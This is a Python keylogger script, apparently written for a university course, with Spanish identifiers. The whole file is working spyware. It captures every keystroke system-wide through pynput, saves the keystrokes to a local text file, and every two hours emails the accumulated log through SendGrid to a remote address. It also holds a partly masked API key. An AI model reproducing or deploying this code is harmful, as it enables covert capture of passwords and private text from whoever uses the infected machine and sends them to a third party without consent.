import time
import threading
import sys
import os
from pynput import keyboard
from threading import Timer
from datetime import datetime
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

GUARDAR_CADA_SEGUNDOS = 1
ENVIAR_MAIL_SEGUNDOS = 7200  # 2 horas
FROM_EMAIL = '***@gmail.com'
TO_EMAIL = '***@uoc.edu'
SENDGRID_API_KEY = 'SG.***************************IF7leQ'
KEY = keyboard.Key
PATH = "pulsaciones_grabadas.txt"
HOTKEY_SALIR = "<ctrl>+<alt>+q"


class main:
    def __init__(self):
        self.hotkeylistener = keyboard.GlobalHotKeys(
            {HOTKEY_SALIR: self.parar})
        self.listener = keyboard.Listener(
            on_press=self.on_press)
        self.log = ""
        self.path = PATH
        self.running = False
        self.last_keypress = datetime.now()

    def start(self):
        self.listener.start()
        self.hotkeylistener.start()
        self.running = True
        self.sendmail(init=True)

        while True:
            time.sleep(GUARDAR_CADA_SEGUNDOS)
            if not self.running:
                break
            if self.log != "":
                self.guardar()
                self.log = ""

    def parar(self):
        self.sendmail()
        self.listener.stop()
        self.hotkeylistener.stop()
        self.running = False
        threading.Thread.__init__(self.listener)
        threading.Thread.__init__(self.hotkeylistener)
        sys.exit()

    def on_press(self, event):
        minutes_since_last_keypress = (
            datetime.now()-self.last_keypress).total_seconds() / 60.0
        if minutes_since_last_keypress > 5.0:
            self.log += "\n"

        self.last_keypress = datetime.now()

        if event == KEY.enter:
            self.log += "\n"
        elif event == KEY.tab:
            self.log += "[Tab]"
        elif event == KEY.backspace:
            self.log += "[backspace]"
        elif event == KEY.space:
            self.log += " "
        elif type(event) == KEY:
            self.log += ""
        else:
            self.log += str(event).replace("'", "")

    def guardar(self):
        with open(os.path.join(os.getcwd(), self.path), "a", encoding="utf-8") as f:
            f.write(self.log)
        return True

    def sendmail(self, init=False):
        timer = Timer(ENVIAR_MAIL_SEGUNDOS, self.sendmail)
        timer.daemon = True
        timer.start()

        if (init == False):
            file = open(self.path, "r")
            message = Mail(
                from_email=FROM_EMAIL,
                to_emails=TO_EMAIL,
                subject=f'Keylogger backup {datetime.now()}',
                plain_text_content=file.read())
            try:
                sg = SendGridAPIClient(SENDGRID_API_KEY)
                response = sg.send(message)
                print(message)
            except Exception as e:
                return False

        return True


if __name__ == "__main__":
    main = main()
    main.start()
